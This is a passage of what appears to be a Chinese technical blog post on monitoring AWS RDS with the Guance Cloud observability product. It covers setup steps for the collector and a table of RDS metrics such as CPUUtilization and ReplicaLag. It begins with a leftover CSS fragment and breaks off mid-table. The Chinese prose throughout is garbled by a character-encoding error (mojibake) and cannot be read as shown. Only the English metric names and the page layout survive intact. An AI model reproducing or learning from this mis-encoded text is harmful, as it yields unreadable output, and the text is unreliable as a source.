h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">AWS RDS ä»‹ç»</h2>
<p>AWS RDSï¼ˆAmazon Relational Database Serviceï¼‰æ˜¯ä¸€ç§ç”±äºšé©¬é€Šæä¾›çš„å®Œå…¨æ‰˜ç®¡çš„å…³ç³»æ•°æ®åº“æœåŠ¡ï¼Œæ”¯æŒå¤šç§æµè¡Œçš„æ•°æ®åº“å¼•æ“ï¼Œå¦‚ MySQLã€MariaDBã€PostgreSQLã€Oracle å’Œ SQL Serverã€‚è¿™é¡¹æœåŠ¡çš„ä¸»è¦ä¼˜åŠ¿åœ¨äºç®€åŒ–äº†åœ¨äº‘ä¸­éƒ¨ç½²ã€æ“ä½œå’Œæ‰©å±•å…³ç³»æ•°æ®åº“çš„å¤æ‚æ€§ï¼Œæ— éœ€ç”¨æˆ·è‡ªè¡Œç®¡ç†åº•å±‚çš„åŸºç¡€è®¾æ–½ã€‚å®ƒæä¾›äº†è‡ªåŠ¨å¤‡ä»½å’Œæ¢å¤ã€è‡ªåŠ¨ç»´æŠ¤ã€é«˜å¯ç”¨æ€§å’Œå®¹é”™èƒ½åŠ›ã€å¯æ‰©å±•æ€§ä»¥åŠå®‰å…¨æ€§ç­‰å…³é”®ç‰¹æ€§ã€‚</p>
<p>å°½ç®¡ AWS RDS æå¤§åœ°é™ä½äº†æ•°æ®åº“ç®¡ç†çš„å¤æ‚æ€§ï¼Œä½†å¯¹å…¶è¿›è¡Œç›‘æ§å’Œå¯è§‚æµ‹æ€§ä»ç„¶æ˜¯è‡³å…³é‡è¦çš„ã€‚ç›‘æ§å¯ä»¥å¸®åŠ©ä¼˜åŒ–æ•°æ®åº“æ€§èƒ½ï¼Œé€šè¿‡åˆ†ææ€§èƒ½æŒ‡æ ‡å¦‚ CPUã€å†…å­˜ä½¿ç”¨ç‡ã€ç£ç›˜ I/O å’Œç½‘ç»œæµé‡ç­‰ï¼ŒåŠæ—¶è¯†åˆ«å¹¶è§£å†³æ€§èƒ½ç“¶é¢ˆã€‚æ­¤å¤–ï¼Œç›‘æ§è¿˜æœ‰åŠ©äºæ•…éšœæ£€æµ‹ï¼Œå¯ä»¥å¿«é€Ÿè¯†åˆ«å¹¶å“åº”æ•°æ®åº“çš„å¼‚å¸¸æƒ…å†µï¼Œå¦‚è¿æ¥å¤±è´¥ã€æŸ¥è¯¢è¶…æ—¶ç­‰ã€‚å®ƒè¿˜æ”¯æŒå®¹é‡è§„åˆ’ï¼Œé€šè¿‡åˆ†æå†å²ä½¿ç”¨æ•°æ®é¢„æµ‹èµ„æºéœ€æ±‚ï¼Œä»¥åˆç†è§„åˆ’å’Œåˆ†é…èµ„æºã€‚å®‰å…¨æ€§æ–¹é¢ï¼Œç›‘æ§å¯ä»¥å¸®åŠ©æ£€æµ‹æ½œåœ¨çš„å®‰å…¨å¨èƒï¼Œå¦‚æœªæˆæƒè®¿é—®å’Œ SQL æ³¨å…¥æ”»å‡»ï¼Œä»è€Œé‡‡å–ç›¸åº”çš„é˜²å¾¡æªæ–½ã€‚æ­¤å¤–ï¼Œç›‘æ§è¿˜æœ‰åŠ©äºæˆæœ¬æ§åˆ¶ï¼Œé€šè¿‡è¯†åˆ«ä¸å¿…è¦çš„èµ„æºæ¶ˆè€—æ¥ä¼˜åŒ–æˆæœ¬ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥æ»¡è¶³æŸäº›è¡Œä¸šæˆ–åœ°åŒºå¯¹äºæ•°æ®åº“å¯è§‚æµ‹æ€§çš„ç‰¹å®šåˆè§„è¦æ±‚ã€‚</p>
<h2 data-id="heading-1">è§‚æµ‹äº‘</h2>
<p>è§‚æµ‹äº‘æ˜¯ä¸€æ¬¾ä¸“ä¸º IT å·¥ç¨‹å¸ˆæ‰“é€ çš„å…¨é“¾è·¯å¯è§‚æµ‹äº§å“ï¼Œå®ƒé›†æˆäº†åŸºç¡€è®¾æ–½ç›‘æ§ã€åº”ç”¨ç¨‹åºæ€§èƒ½ç›‘æ§å’Œæ—¥å¿—ç®¡ç†ï¼Œä¸ºæ•´ä¸ªæŠ€æœ¯æ ˆæä¾›å®æ—¶å¯è§‚å¯Ÿæ€§ã€‚è¿™æ¬¾äº§å“èƒ½å¤Ÿå¸®åŠ©å·¥ç¨‹å¸ˆå…¨é¢äº†è§£ç«¯åˆ°ç«¯çš„ç”¨æˆ·ä½“éªŒè¿½è¸ªï¼Œäº†è§£åº”ç”¨å†…å‡½æ•°çš„æ¯ä¸€æ¬¡è°ƒç”¨ï¼Œä»¥åŠå…¨é¢ç›‘æ§äº‘æ—¶ä»£çš„åŸºç¡€è®¾æ–½ã€‚æ­¤å¤–ï¼Œè§‚æµ‹äº‘è¿˜å…·å¤‡å¿«é€Ÿå‘ç°ç³»ç»Ÿå®‰å…¨é£é™©çš„èƒ½åŠ›ï¼Œä¸ºæ•°å­—åŒ–æ—¶ä»£æä¾›å®‰å…¨ä¿éšœã€‚</p>
<h3 data-id="heading-2">é‡‡é›†å™¨é…ç½®</h3>
<ol>
<li>ç™»é™†è§‚æµ‹äº‘æ§åˆ¶å°</li>
<li>ç‚¹å‡»ã€é›†æˆã€‘èœå•ï¼Œé€‰æ‹©ã€äº‘è´¦å·ç®¡ç†ã€‘</li>
<li>ç‚¹å‡»ã€æ·»åŠ äº‘è´¦å·ã€‘ï¼Œé€‰æ‹©ã€AWSã€‘ï¼Œå¡«å†™ç•Œé¢æ‰€éœ€çš„ä¿¡æ¯ï¼Œå¦‚ä¹‹å‰å·²é…ç½®è¿‡äº‘è´¦å·ä¿¡æ¯ï¼Œåˆ™å¿½ç•¥æ­¤æ­¥éª¤</li>
<li>ç‚¹å‡»ã€æµ‹è¯•ã€‘ï¼Œæµ‹è¯•æˆåŠŸåç‚¹å‡»ã€ä¿å­˜ã€‘ï¼Œå¦‚æœæµ‹è¯•å¤±è´¥ï¼Œè¯·æ£€æŸ¥ç›¸å…³é…ç½®ä¿¡æ¯æ˜¯å¦æ­£ç¡®ï¼Œå¹¶é‡æ–°æµ‹è¯•</li>
<li>ç‚¹å‡»ã€äº‘è´¦å·ç®¡ç†ã€‘åˆ—è¡¨ä¸Šå¯ä»¥çœ‹åˆ°å·²æ·»åŠ çš„äº‘è´¦å·ï¼Œç‚¹å‡»ç›¸åº”çš„äº‘è´¦å·ï¼Œè¿›å…¥è¯¦æƒ…é¡µ</li>
<li>ç‚¹å‡»äº‘è´¦å·è¯¦æƒ…é¡µçš„ã€é›†æˆã€‘æŒ‰é’®ï¼Œåœ¨æœªå®‰è£…åˆ—è¡¨ä¸‹ï¼Œæ‰¾åˆ°AWS RDS Mysqlï¼Œç‚¹å‡»ã€å®‰è£…ã€‘æŒ‰é’®ï¼Œå¼¹å‡ºå®‰è£…ç•Œé¢å®‰è£…å³å¯ã€‚</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ef2a6f850768419184f08dcb5c09f3ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995228&amp;x-signature=Gglf4fTC32dxQdBYFQM6E%2B1C5Fc%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">å…³é”®æŒ‡æ ‡</h3>



































































































































































































































<table><thead><tr><th>æŒ‡æ ‡</th><th>æ§åˆ¶å°åç§°</th><th>æè¿°</th><th>å•ä½</th></tr></thead><tbody><tr><td>BinLogDiskUsage</td><td>äºŒè¿›åˆ¶æ—¥å¿—ç£ç›˜ä½¿ç”¨æƒ…å†µï¼ˆMBï¼‰</td><td>äºŒè¿›åˆ¶æ—¥å¿—æ‰€å çš„ç£ç›˜ç©ºé—´å¤§å°ã€‚å¦‚æœä¸º MySQL å’Œ MariaDB å®ä¾‹ï¼ˆåŒ…æ‹¬åªè¯»å‰¯æœ¬ï¼‰å¯ç”¨äº†è‡ªåŠ¨å¤‡ä»½ï¼Œåˆ™ä¼šåˆ›å»ºäºŒè¿›åˆ¶æ—¥å¿—ã€‚</td><td>å­—èŠ‚</td></tr><tr><td>BurstBalance</td><td>çªå‘ä½™é¢ï¼ˆç™¾åˆ†æ¯”ï¼‰</td><td>å¯ç”¨çš„é€šç”¨å‹ SSD (GP2) çªå¢å­˜å‚¨æ¡¶ I/O ç‚¹æ•°çš„ç™¾åˆ†æ¯”ã€‚</td><td>ç™¾åˆ†æ¯”</td></tr><tr><td>CheckpointLag</td><td>æ£€æŸ¥ç‚¹æ»åï¼ˆæ¯«ç§’ï¼‰</td><td>è‡ªæœ€è¿‘ä¸€æ¬¡æ£€æŸ¥ç‚¹ä»¥æ¥çš„æ—¶é—´ã€‚ä»…é€‚ç”¨äº RDS for PostgreSQLã€‚</td><td>æ¯«ç§’</td></tr><tr><td>ConnectionAttempts</td><td>è¿æ¥å°è¯•ï¼ˆè®¡æ•°ï¼‰</td><td>å°è¯•è¿æ¥å®ä¾‹çš„æ¬¡æ•°ï¼Œæ— è®ºæˆåŠŸä¸å¦ã€‚</td><td>è®¡æ•°</td></tr><tr><td>CPUUtilization</td><td>CPU åˆ©ç”¨ç‡ï¼ˆç™¾åˆ†æ¯”ï¼‰</td><td>CPU ä½¿ç”¨ç™¾åˆ†ç‡ã€‚</td><td>ç™¾åˆ†æ¯”</td></tr><tr><td>CPUCreditUsage</td><td>CPU é¢åº¦ä½¿ç”¨ï¼ˆè®¡æ•°ï¼‰</td><td>ï¼ˆT2 å®ä¾‹ï¼‰å®ä¾‹ä¸ºä¿æŒ CPU ä½¿ç”¨ç‡è€ŒèŠ±è´¹çš„ CPU ç§¯åˆ†æ•°ã€‚ä¸€ä¸ª CPU ç§¯åˆ†ç­‰äºä¸€ä¸ª vCPU ä»¥ 100% çš„ä½¿ç”¨ç‡è¿è¡Œä¸€åˆ†é’Ÿæˆ–ç­‰åŒçš„ vCPUã€ä½¿ç”¨ç‡ä¸æ—¶é—´çš„ç»„åˆã€‚ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥æœ‰ä¸€ä¸ª vCPU æŒ‰ 50% ä½¿ç”¨ç‡è¿è¡Œä¸¤åˆ†é’Ÿï¼Œæˆ–è€…ä¸¤ä¸ª vCPU æŒ‰ 25% ä½¿ç”¨ç‡è¿è¡Œä¸¤åˆ†é’Ÿã€‚CPU ç§¯åˆ†æŒ‡æ ‡ä»…æ¯ 5 åˆ†é’Ÿæä¾›ä¸€æ¬¡ã€‚å¦‚æœæ‚¨æŒ‡å®šä¸€ä¸ªå¤§äºäº”åˆ†é’Ÿçš„æ—¶é—´æ®µï¼Œè¯·ä½¿ç”¨Sum ç»Ÿè®¡æ•°æ®ï¼Œè€Œé Average ç»Ÿè®¡æ•°æ®ã€‚</td><td>ç§¯åˆ† (vCPU åˆ†é’Ÿ)</td></tr><tr><td>CPUCreditBalance</td><td>CPU é¢åº¦ä½™é¢ï¼ˆè®¡æ•°ï¼‰</td><td>ï¼ˆT2 å®ä¾‹ï¼‰å®ä¾‹è‡ªå¯åŠ¨åå·²ç´¯ç§¯è·å¾—çš„ CPU ç§¯åˆ†æ•°ã€‚å¯¹äº T2 æ ‡å‡†ï¼ŒCPUCreditBalance è¿˜åŒ…å«å·²ç´¯ç§¯çš„å¯åŠ¨ç§¯åˆ†æ•°ã€‚åœ¨è·å¾—ç§¯åˆ†åï¼Œç§¯åˆ†å°†åœ¨ç§¯åˆ†ä½™é¢ä¸­ç´¯ç§¯ï¼›åœ¨èŠ±è´¹ç§¯åˆ†åï¼Œå°†ä»ç§¯åˆ†ä½™é¢ä¸­æ‰£é™¤ç§¯åˆ†ã€‚ç§¯åˆ†ä½™é¢å…·æœ‰æœ€å¤§å€¼é™åˆ¶ï¼Œè¿™æ˜¯ç”±å®ä¾‹å¤§å°å†³å®šçš„ã€‚åœ¨è¾¾åˆ°é™åˆ¶åï¼Œå°†ä¸¢å¼ƒè·å¾—çš„ä»»ä½•æ–°ç§¯åˆ†ã€‚å¯¹äº T2 æ ‡å‡†ï¼Œå¯åŠ¨ç§¯åˆ†ä¸è®¡å…¥é™åˆ¶ã€‚å®ä¾‹å¯ä»¥èŠ±è´¹ CPUCreditBalance ä¸­çš„ç§¯åˆ†ï¼Œä»¥ä¾¿çªå¢åˆ°åŸºå‡† CPU ä½¿ç”¨ç‡ä»¥ä¸Šã€‚åœ¨å®ä¾‹è¿è¡Œè¿‡ç¨‹ä¸­ï¼ŒCPUCreditBalance ä¸­çš„ç§¯åˆ†ä¸ä¼šè¿‡æœŸã€‚åœ¨å®ä¾‹åœæ­¢æ—¶ï¼ŒCPUCreditBalance ä¸ä¼šä¿ç•™ï¼Œå¹¶ä¸”æ‰€æœ‰ç´¯ç§¯çš„ç§¯åˆ†éƒ½å°†ä¸¢å¤±ã€‚CPU ä¿¡ç”¨æŒ‡æ ‡ä»…æ¯ 5 åˆ†é’Ÿæä¾›ä¸€æ¬¡ã€‚å¯åŠ¨ç§¯åˆ†åœ¨ Amazon RDS ä¸­çš„ä½œç”¨æ–¹å¼ä¸åœ¨ Amazon EC2 ä¸­çš„ä½œç”¨æ–¹å¼ç›¸åŒã€‚</td><td>ç§¯åˆ†ï¼ˆvCPU åˆ†é’Ÿï¼‰</td></tr><tr><td>DatabaseConnections</td><td>æ•°æ®åº“è¿æ¥ï¼ˆè®¡æ•°ï¼‰</td><td>è¿æ¥è‡³æ•°æ®åº“å®ä¾‹çš„å®¢æˆ·ç«¯ç½‘ç»œè¿æ¥æ•°ã€‚æ•°æ®åº“ä¼šè¯æ•°å¯èƒ½é«˜äºæŒ‡æ ‡å€¼ï¼Œå› ä¸ºæŒ‡æ ‡å€¼ä¸åŒ…æ‹¬ä»¥ä¸‹å†…å®¹ï¼šä¸å†å…·æœ‰ç½‘ç»œè¿æ¥ä½†æ•°æ®åº“å°šæœªæ¸…ç†çš„ä¼šè¯æ•°æ®åº“å¼•æ“å‡ºäºè‡ªèº«ç›®çš„åˆ›å»ºçš„ä¼šè¯ç”±æ•°æ®åº“å¼•æ“çš„å¹¶è¡Œæ‰§è¡ŒåŠŸèƒ½åˆ›å»ºçš„ä¼šè¯ç”±æ•°æ®åº“å¼•æ“ä»»åŠ¡è®¡åˆ’ç¨‹åºåˆ›å»ºçš„ä¼šè¯Amazon RDS è¿æ¥</td><td>è®¡æ•°</td></tr><tr><td>DiskQueueDepth</td><td>é˜Ÿåˆ—æ·±åº¦ï¼ˆè®¡æ•°ï¼‰</td><td>ç­‰å¾…è®¿é—®ç£ç›˜çš„æœªå®Œæˆ I/Oï¼ˆè¯»å–/å†™å…¥è¯·æ±‚ï¼‰çš„æ•°é‡ã€‚</td><td>è®¡æ•°</td></tr><tr><td>EBSByteBalance</td><td>EBS å­—èŠ‚ä½™é¢ï¼ˆç™¾åˆ†æ¯”ï¼‰</td><td>RDS æ•°æ®åº“çªå¢å­˜å‚¨æ¡¶ä¸­å‰©ä½™çš„ååé‡ç§¯åˆ†çš„ç™¾åˆ†æ¯” æ­¤æŒ‡æ ‡ä»…å¯¹åŸºæœ¬ç›‘æ§å¯ç”¨ã€‚è¯¥æŒ‡æ ‡å€¼åŸºäºåŒ…æ‹¬æ ¹å·åœ¨å†…çš„æ‰€æœ‰å·çš„ååé‡å’Œ IOPSï¼Œè€Œä¸æ˜¯ä»…åŸºäºé‚£äº›åŒ…å«æ•°æ®åº“æ–‡ä»¶çš„å·ã€‚</td><td>ç™¾åˆ†æ¯”</td></tr><tr><td>EBSIOBalance</td><td>EBS IO ä½™é¢ï¼ˆç™¾åˆ†æ¯”ï¼‰</td><td>RDS æ•°æ®åº“çªå¢å­˜å‚¨æ¡¶ä¸­å‰©ä½™çš„ I/O ç§¯åˆ†çš„ç™¾åˆ†æ¯” æ­¤æŒ‡æ ‡ä»…å¯¹åŸºæœ¬ç›‘æ§å¯ç”¨ã€‚è¯¥æŒ‡æ ‡å€¼åŸºäºåŒ…æ‹¬æ ¹å·åœ¨å†…çš„æ‰€æœ‰å·çš„ååé‡å’Œ IOPSï¼Œè€Œä¸æ˜¯ä»…åŸºäºé‚£äº›åŒ…å«æ•°æ®åº“æ–‡ä»¶çš„å·ã€‚</td><td>ç™¾åˆ†æ¯”</td></tr><tr><td>FailedSQLServerAgentJobsCount</td><td>å¤±è´¥çš„ SQL Server Agent ä½œä¸šè®¡æ•°ï¼ˆè®¡æ•°/åˆ†é’Ÿï¼‰</td><td>è¿‡å» 1 åˆ†é’Ÿå†…å¤±è´¥çš„ Microsoft SQL Server Agent ä½œä¸šçš„æ•°é‡ã€‚</td><td>æ¯åˆ†é’Ÿè®¡æ•°</td></tr><tr><td>FreeableMemory</td><td>å¯ç”¨å†…å­˜ï¼ˆMBï¼‰</td><td>éšæœºå­˜å–å†…å­˜çš„å¯ç”¨å¤§å°ã€‚å¯¹äº MariaDBã€MySQLã€Oracle å’Œ PostgreSQL æ•°æ®åº“å®ä¾‹ï¼Œæ­¤æŒ‡æ ‡æŠ¥å‘Š MemAvailable çš„ /proc/meminfo å­—æ®µçš„å€¼ã€‚</td><td>å­—èŠ‚</td></tr><tr><td>FreeLocalStorage</td><td>å¯ç”¨æœ¬åœ°å­˜å‚¨ï¼ˆMBï¼‰</td><td>å¯ç”¨æœ¬åœ°å­˜å‚¨ç©ºé—´çš„å¤§å°ã€‚æ­¤æŒ‡æ ‡ä»…é€‚ç”¨äºå…·æœ‰ NVMe SSD å®ä¾‹å­˜å‚¨å·çš„æ•°æ®åº“å®ä¾‹ç±»ã€‚</td><td>å­—èŠ‚</td></tr><tr><td>FreeStorageSpace</td><td>å¯ç”¨å­˜å‚¨ç©ºé—´ (MB)</td><td>å¯ç”¨å­˜å‚¨ç©ºé—´çš„å¤§å°ã€‚</td><td>å­—èŠ‚</td></tr><tr><td>MaximumUsedTransactionIDs</td><td>æœ€å¤§å·²ç”¨äº‹åŠ¡ IDï¼ˆè®¡æ•°ï¼‰</td><td>å·²ä½¿ç”¨çš„æœ€å¤§äº‹åŠ¡ IDã€‚ä»…é€‚ç”¨äº PostgreSQLã€‚</td><td>è®¡æ•°</td></tr><tr><td>NetworkReceiveThroughput</td><td>ç½‘ç»œæ¥æ”¶ååé‡ï¼ˆMB/ç§’ï¼‰</td><td>æ•°æ®åº“å®ä¾‹çš„ä¼ å…¥ï¼ˆæ¥æ”¶ï¼‰ç½‘ç»œæµé‡ï¼ŒåŒ…æ‹¬ç”¨äºç›‘æ§å’Œå¤åˆ¶çš„å®¢æˆ·æ•°æ®åº“æµé‡å’Œ Amazon RDS æµé‡ã€‚</td><td>æ¯ç§’å­—èŠ‚æ•°</td></tr><tr><td>NetworkTransmitThroughput</td><td>ç½‘ç»œä¼ è¾“ååé‡ï¼ˆMB/ç§’ï¼‰</td><td>æ•°æ®åº“å®ä¾‹çš„ä¼ å‡ºï¼ˆä¼ è¾“ï¼‰ç½‘ç»œæµé‡ï¼ŒåŒ…æ‹¬ç”¨äºç›‘æ§å’Œå¤åˆ¶çš„å®¢æˆ·æ•°æ®åº“æµé‡å’Œ Amazon RDS æµé‡ã€‚</td><td>æ¯ç§’å­—èŠ‚æ•°</td></tr><tr><td>OldestReplicationSlotLag</td><td>æœ€æ—©å‰¯æœ¬æ§½æ»å (MB)</td><td>åœ¨æ¥æ”¶é¢„å†™æ—¥å¿— (WAL) æ•°æ®æ–¹é¢æœ€æ»åçš„å‰¯æœ¬çš„æ»åå¤§å°ã€‚é€‚ç”¨äº PostgreSQLã€‚</td><td>å­—èŠ‚</td></tr><tr><td>ReadIOPS</td><td>è¯»å– IOPSï¼ˆè®¡æ•°/ç§’ï¼‰</td><td>æ¯ç§’å¹³å‡ç£ç›˜è¯»å– I/O æ“ä½œæ•°ã€‚</td><td>æ¯ç§’è®¡æ•°</td></tr><tr><td>ReadIOPSLocalStorage</td><td>è¯»å– IOPS æœ¬åœ°å­˜å‚¨ï¼ˆè®¡æ•°/ç§’ï¼‰</td><td>æ¯ç§’è‡³æœ¬åœ°å­˜å‚¨çš„å¹³å‡ç£ç›˜è¯»å–è¾“å…¥/è¾“å‡ºæ“ä½œæ•°ã€‚æ­¤æŒ‡æ ‡ä»…é€‚ç”¨äºå…·æœ‰ NVMe SSD å®ä¾‹å­˜å‚¨å·çš„æ•°æ®åº“å®ä¾‹ç±»ã€‚</td><td>æ¯ç§’è®¡æ•°</td></tr><tr><td>ReadLatency</td><td>è¯»å–å»¶è¿Ÿï¼ˆæ¯«ç§’ï¼‰</td><td>æ¯ä¸ªç£ç›˜ I/O æ“ä½œæ‰€éœ€çš„å¹³å‡æ—¶é—´ã€‚</td><td>æ¯«ç§’</td></tr><tr><td>ReadLatencyLocalStorage</td><td>è¯»å–å»¶è¿Ÿæœ¬åœ°å­˜å‚¨ï¼ˆæ¯«ç§’ï¼‰</td><td>æ¯ä¸ªç£ç›˜å¯¹æœ¬åœ°å­˜å‚¨è¾“å…¥/è¾“å‡ºæ“ä½œæ‰€éœ€çš„å¹³å‡æ—¶é—´ã€‚æ­¤æŒ‡æ ‡ä»…é€‚ç”¨äºå…·æœ‰ NVMe SSD å®ä¾‹å­˜å‚¨å·çš„æ•°æ®åº“å®ä¾‹ç±»ã€‚</td><td>æ¯«ç§’</td></tr><tr><td>ReadThroughput</td><td>è¯»å–ååé‡ï¼ˆMB/ç§’ï¼‰</td><td>æ¯ç§’ä»ç£ç›˜è¯»å–çš„å¹³å‡å­—èŠ‚æ•°ã€‚</td><td>æ¯ç§’å­—èŠ‚æ•°</td></tr><tr><td>ReadThroughputLocalStorage</td><td>è¯»å–ååé‡æœ¬åœ°å­˜å‚¨ï¼ˆMB/ç§’ï¼‰</td><td>æ¯ç§’ä»ç£ç›˜è‡³æœ¬åœ°å­˜å‚¨è¯»å–çš„å¹³å‡å­—èŠ‚æ•°ã€‚æ­¤æŒ‡æ ‡ä»…é€‚ç”¨äºå…·æœ‰ NVMe SSD å®ä¾‹å­˜å‚¨å·çš„æ•°æ®åº“å®ä¾‹ç±»ã€‚</td><td>æ¯ç§’å­—èŠ‚æ•°</td></tr><tr><td>ReplicaLag</td><td>å‰¯æœ¬æ»åï¼ˆæ¯«ç§’ï¼‰</td><td>å¯¹äºåªè¯»å‰¯æœ¬é…ç½®ï¼Œåªè¯»å‰¯æœ¬æ•°æ®åº“å®ä¾‹æ»åäºæºæ•°æ®åº“å®ä¾‹çš„æ—¶é—´é‡ã€‚é€‚ç”¨äº MariaDBã€Microsoft SQL Serverã€MySQLã€Oracle å’Œ PostgreSQL åªè¯»å‰¯æœ¬ã€‚å¯¹äºå¤šå¯ç”¨åŒºæ•°æ®åº“é›†ç¾¤ï¼Œå†™å…¥å™¨æ•°æ®åº“å®ä¾‹ä¸Šçš„æœ€æ–°äº‹åŠ¡ä¸è¯»å–å™¨æ•°æ®åº“å®ä¾‹ä¸Šçš„æœ€æ–°åº”ç”¨äº‹åŠ¡ä¹‹é—´çš„æ—¶é—´å·®å¼‚ã€‚</td><td>æ¯«ç§’</td></tr><tr><td>ReplicationSlotDiskUsage</td><td>å‰¯æœ¬æ’æ§½ç£ç›˜ä½¿ç”¨æƒ…å†µï¼ˆMBï¼‰</td><td>å‰¯æœ¬æ§½æ–‡ä»¶ä½¿ç”¨çš„ç£ç›˜ç©ºé—´ã€‚é€‚ç”¨äº PostgreSQLã€‚</td><td>å­—èŠ‚</td></tr><tr><td>SwapUsage</td><td>äº¤æ¢åŒºä½¿ç”¨æƒ…å†µï¼ˆMBï¼‰</td><td>æ•°æ®åº“å®ä¾‹ä¸Šä½¿ç”¨çš„äº¤æ¢ç©ºé—´çš„å¤§å°ã€‚æ­¤æŒ‡æ ‡å¯¹äº SQL Server ä¸å¯ç”¨ã€‚</td><td>å­—èŠ‚</td></tr><tr><td>TransactionLogsDiskUsage</td><td>äº‹åŠ¡æ—¥å¿—ç£ç›˜ä½¿ç”¨æƒ…å†µï¼ˆMBï¼‰</td><td>äº‹åŠ¡æ—¥å¿—ä½¿ç”¨çš„ç£ç›˜ç©ºé—´ã€‚é€‚ç”¨äº PostgreSQLã€‚</td><td>å­—èŠ‚</td></tr><tr><td>TransactionLogsGeneration</td><td>äº‹åŠ¡æ—¥å¿—ç”Ÿæˆï¼ˆMB/ç§’ï¼‰</td><td>æ¯ç§’ç”Ÿæˆçš„äº‹åŠ¡æ—¥å¿—çš„å¤§å°ã€‚é€‚ç”¨äº PostgreSQLã€‚</td><td>æ¯ç§’å­—èŠ‚æ•°</td></tr><tr><td>WriteIOPS</td><td>å†™å…¥ IOPSï¼ˆè®¡æ•°/ç§’ï¼‰</td><td>æ¯ç§’å¹³å‡ç£ç›˜å†™å…¥ I/O æ“ä½œæ•°ã€‚</td><td>æ¯ç§’è®¡æ•°</td></tr><tr><td>WriteIOPSLocalStorage</td><td>å†™å…¥ IOPS æœ¬åœ°å­˜å‚¨ï¼ˆè®¡æ•°/ç§’ï¼‰</td><td>æœ¬åœ°å­˜å‚¨ä¸Šçš„æ¯ç§’å¹³å‡ç£ç›˜å†™å…¥ I/O æ“ä½œæ•°ã€‚æ­¤æŒ‡æ ‡ä»…é€‚ç”¨äºå…·æœ‰ NVMe SSD å®ä¾‹å­˜å‚¨å·çš„æ•°æ®åº“å®ä¾‹ç±»ã€‚</td><td>æ¯ç§’è®¡æ•°</td></tr><tr><td>WriteLatency</td><td>å†™å…¥å»¶è¿Ÿï¼ˆæ¯«ç§’ï¼‰</td><td>æ¯ä¸ªç£ç›˜ I/O æ“ä½œæ‰€éœ€çš„å¹³å‡æ—¶é—´ã€‚</td><td>æ¯«ç§’</td></tr><tr><td>WriteLatencyLocalStorage</td><td>å†™å…¥å»¶è¿Ÿæœ¬åœ°å­˜å‚¨ï¼ˆæ¯«ç§’ï¼‰</td><td>æœ¬åœ°å­˜å‚¨ä¸Šæ¯ä¸ªç£ç›˜ I/O æ“ä½œæ‰€éœ€çš„å¹³å‡æ—¶é—´ã€‚æ­¤æŒ‡æ ‡ä»…é€‚ç”¨äºå…·æœ‰ NVMe SSD 